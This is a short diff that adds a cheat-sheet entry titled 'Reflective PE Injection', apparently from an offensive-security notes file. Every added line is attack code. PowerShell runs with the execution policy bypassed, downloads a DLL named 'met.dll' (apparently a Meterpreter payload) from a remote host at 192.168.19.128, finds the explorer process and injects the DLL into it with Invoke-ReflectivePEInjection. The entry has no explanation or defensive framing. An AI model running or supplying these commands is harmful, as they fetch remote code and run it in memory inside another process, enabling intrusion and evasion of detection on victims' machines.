@@ -1,0 +1,6 @@
+## Reflective PE Injection
+PowerShell -Exec Bypass
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.19.128:8000/met.dll')
+$procid = (Get-Process -Name explorer).Id
+Import-Module Invoke-ReflectivePEInjection.ps1
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
